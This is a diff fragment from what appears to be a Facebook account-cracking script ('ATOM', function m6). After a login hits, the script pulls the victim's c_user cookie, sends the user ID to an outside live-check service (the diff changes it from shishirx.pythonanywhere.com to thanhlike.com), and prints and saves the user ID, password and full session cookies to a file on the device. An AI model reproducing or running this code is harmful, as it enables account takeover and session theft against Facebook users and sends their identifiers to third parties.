@@ -1245,7 +1245,7 @@ def m6(idf,pwv):
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+    url = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={user}"
     reqx = requests.get(url).text
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
@@ -1253,9 +1253,9 @@ def m6(idf,pwv):
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
-    if 'lock' in reqx:
+    if 'die' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
-            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            print(f"\r\x1b[1;91mCOOKIES=[🤖]: {coki}\33[1;36m")
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
